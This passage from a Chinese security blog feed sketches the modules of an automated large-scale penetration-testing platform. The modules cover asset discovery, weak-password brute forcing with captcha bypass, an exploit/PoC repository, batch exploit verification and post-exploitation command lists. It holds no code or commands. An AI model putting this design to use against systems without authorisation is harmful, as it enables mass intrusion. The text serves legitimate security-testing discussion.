&lt;p&gt;内网和外网入口本身可能存在认证vpn【默认密码、弱口令】，甚至匿名代理。而通过他们我们也可以跨网段进行渗透。&lt;/p&gt;

&lt;h3 id=&quot;后记&quot;&gt;后记&lt;/h3&gt;

&lt;p&gt;本文大部分资料参考自网络，因为内容太多无法一一附上出处，有介意的原作者请私信我加上。
最后，感谢某云、FB、数字等等，感谢互联网上所有热爱分享的童鞋们。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在内网横向与后渗透的过程中，会有一些细节比较蛋疼。而真正系统地讲述内网和后渗透的书籍，也就那么寥寥几本，就算想掏大美刀也没地儿买去。</summary></entry><entry><title type="html">规模渗透架构部署设想</title><link href="/pentest/2017/12/16/architecture-of-apt-pentest/" rel="alternate" type="text/html" title="规模渗透架构部署设想" /><published>2017-12-16T20:52:18+08:00</published><updated>2017-12-16T20:52:18+08:00</updated><id>/pentest/2017/12/16/architecture-of-apt-pentest</id><content type="html" xml:base="/pentest/2017/12/16/architecture-of-apt-pentest/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;在我们的测试中，可能在对大型目标进行探测时，人手不足就会显得特别无力。这时候，使用机器代替人工进行一些重复性工作，就显得尤为重要。咱们在这儿来谈谈，如何开发和部署APT渗透系统的架构。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;web扫描系统&quot;&gt;web扫描系统&lt;/h3&gt;

&lt;p&gt;在web扫描框架上，我们可以这样设计：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;信息探测模块：通过指定URL，自动获取该网站的基本信息。&lt;/li&gt;
  &lt;li&gt;资产发现模块：收集子域名，并对主机IP资产进行梳理。&lt;/li&gt;
  &lt;li&gt;基础扫描模块：对网站进行路径探测，对系统进行端口探测。&lt;/li&gt;
  &lt;li&gt;弱口令核查模块：对主机系统和常用CMS网站进行默认/弱口令检测。&lt;/li&gt;
  &lt;li&gt;漏洞扫描模块：以体系内域名URL为入口点，可以只单独探测该URL的web漏洞；也可以根据该入口点，进行自动化资产发现和检测，再统一对获得的资产进行扫描。&lt;/li&gt;
  &lt;li&gt;社工搜集模块：从多个搜索引擎和接口中，提取有需要的信息，供给其他模块使用。&lt;/li&gt;
  &lt;li&gt;第三方扫描模块：可集成第三方扫描器，通过接口进行模块化整合。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;口令核查系统&quot;&gt;口令核查系统&lt;/h3&gt;

&lt;p&gt;在web扫描系统里，本来是集成了弱口令核查模块。但其中仅仅对常用的CMS和系统服务进行了核查，而且力度比较有限。&lt;/p&gt;

&lt;p&gt;此处对口令核查系统的设计，旨在对特定的系统服务或者后台进行爆破，功能大概如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;定制化社工字典，拥有生成选项。&lt;/li&gt;
  &lt;li&gt;可以破解简单验证码。&lt;/li&gt;
  &lt;li&gt;可附加验证码绕过、明文提取选项。&lt;/li&gt;
  &lt;li&gt;集成扫描框架的爆破脚本。&lt;/li&gt;
  &lt;li&gt;集成Hydra和Medusa以及某些工具，供给调用。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;漏洞分储系统&quot;&gt;漏洞分储系统&lt;/h3&gt;

&lt;p&gt;在这个系统上，鄙人将它设计为漏洞库，提供api给第三方调用。&lt;/p&gt;

&lt;p&gt;其中，需要注意以下几点：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;部分提供poc调用，无poc的提供详情。&lt;/li&gt;
  &lt;li&gt;前端提供搜索和查看功能。&lt;/li&gt;
  &lt;li&gt;提供API调用。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;漏洞验证系统&quot;&gt;漏洞验证系统&lt;/h3&gt;

&lt;p&gt;这个功能本来想和漏洞分储系统相结合的，但后来为了耦合性，还是分离了出来。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;支持单条和批量验证。&lt;/li&gt;
  &lt;li&gt;搜索选取漏洞exp。&lt;/li&gt;
  &lt;li&gt;采用中间件来传递消息。&lt;/li&gt;
  &lt;li&gt;延时结果记录。&lt;/li&gt;
  &lt;li&gt;不做数据记录。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;域名采集系统&quot;&gt;域名采集系统&lt;/h3&gt;

&lt;p&gt;最初的版本只做了域名采集的爬虫，但后来考虑到实用性，后期会集成市面上已有的一些域名采集技术。
另外，这里会支持分布式/命令行运行，提供api给第三方调用。管控中心可以一键发送执行。功能如下：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;域名爬虫。&lt;/li&gt;
  &lt;li&gt;其他域名采集技术。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;至于细节，可以参加之前撰写的博文&lt;a href=&quot;/spider/2017/10/19/domain-spider/&quot;&gt;《域名采集爬虫》&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;渗透方案查询&quot;&gt;渗透方案查询&lt;/h3&gt;

&lt;p&gt;这是在某产品经理启发下的产物，在渗透中常常在进行到某一步时，会遇到卡壳的时候。&lt;/p&gt;

&lt;p&gt;这时候我们就需要一个可查阅的清单或者wiki，甚至能给出完整的建设性方案。后来大概考虑了下，大概可以这样构建：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;知名系统获取shell建议（扫描有限制）&lt;/li&gt;
  &lt;li&gt;提权流程列表&lt;/li&gt;
  &lt;li&gt;横向和后渗透命令清单&lt;/li&gt;
  &lt;li&gt;复杂系统获取权限详情&lt;/li&gt;
  &lt;li&gt;powershell脚本功能查询&lt;/li&gt;
  &lt;li&gt;武器库列表&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;渗透报告管理&quot;&gt;渗透报告管理&lt;/h3&gt;

&lt;p&gt;当然，在渗透后可能会有报告输出。也有可能需要上传和填写报告，本系统可能会要求几个点：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;拥有固定格式，可以导出pdf、word等格式。&lt;/li&gt;
  &lt;li&gt;自动整理可能获取权限的机器和敏感IP段。&lt;/li&gt;
  &lt;li&gt;上传报告时，需要填写固定几个要点，比如IP和主机名以及网段，然后再填写细节。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;核管控中心&quot;&gt;核管控中心&lt;/h3&gt;

&lt;p&gt;一套完整的APT渗透框架，总是需要核心管控的，这样方便管理，也能方便全局统筹的需求。
大体功能，可能有以下几点：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;系统机器上线和下线控制。&lt;/li&gt;
  &lt;li&gt;可以API命令调用各系统。&lt;/li&gt;
  &lt;li&gt;以IP或者域名为入口，对所有现存系统数据库进行检索。&lt;/li&gt;
  &lt;li&gt;配置全局参数，不定期更新，对各系统推送。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;

&lt;p&gt;直至撰稿之日，鄙人已经完成了一部分工作。但由于研究方向有变，再加上一些其他不可抗拒的原因，可能开发工作会停滞一段时间。&lt;/p&gt;

&lt;p&gt;在以后恢复开发工作时，应该会有更多的思路更新，与诸君共勉！&lt;/p&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在我们的测试中，可能在对大型目标进行探测时，人手不足就会显得特别无力。这时候，使用机器代替人工进行一些重复性工作，就显得尤为重要。咱们在这儿来谈谈，如何开发和部署APT渗透系统的架构。</summary></entry></feed>